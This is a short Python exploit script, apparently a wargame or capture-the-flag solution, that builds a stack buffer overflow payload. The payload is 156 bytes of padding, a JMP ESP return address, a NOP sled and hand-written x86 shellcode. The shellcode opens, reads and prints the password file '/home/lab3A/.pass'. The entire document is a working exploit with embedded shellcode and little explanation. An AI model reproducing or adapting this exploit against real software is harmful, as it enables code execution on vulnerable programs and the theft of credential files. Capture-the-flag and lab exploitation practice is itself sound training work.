#!/usr/bin/env python
# wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd

import sys, struct

sc  = "\x90" * 50
sc += ( # nasm shellcode.asm -o sc && sickle -r sc -f c
"\xeb\x2e\x5b\x31\xc0\xb0\x05\x31\xc9\xcd\x80\x31\xdb\x88\xc3"
"\x31\xc0\xb0\x03\x89\xe1\x31\xd2\x80\xc2\xff\xcd\x80\x31\xdb"
"\xb3\x01\x89\xe1\x89\xc2\xb0\x04\xcd\x80\x31\xc0\xb0\x01\x88"
"\xc3\xcd\x80\xe8\xcd\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6c"
"\x61\x62\x33\x41\x2f\x2e\x70\x61\x73\x73"
)

offset  = "\x41" * 156
retAddr = struct.pack('<I', 0xb7ffab57) # JMP ESP
# use nulls as trigger to avoid corrupting path to .pass in shellcode
trigger = "\x00" * (500 - (
  len(offset+retAddr+sc)
  )
)

payload = offset + retAddr + sc + trigger

sys.stderr.write("[*] ret written at %d\n" % len(offset))
sys.stderr.write("[*] bytes written %d\n" % len(payload))
sys.stdout.write(payload)

